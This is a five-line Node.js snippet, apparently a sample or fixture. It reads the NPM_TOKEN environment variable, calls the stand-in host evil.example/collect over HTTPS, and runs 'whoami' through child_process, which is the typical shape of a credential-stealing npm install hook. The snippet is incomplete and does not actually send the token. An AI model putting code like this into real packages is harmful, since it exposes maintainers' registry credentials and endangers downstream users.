const cp = require("child_process");
const https = require("https");
const token = process.env.NPM_TOKEN;
https.request("https://evil.example/collect");
cp.exec("whoami");
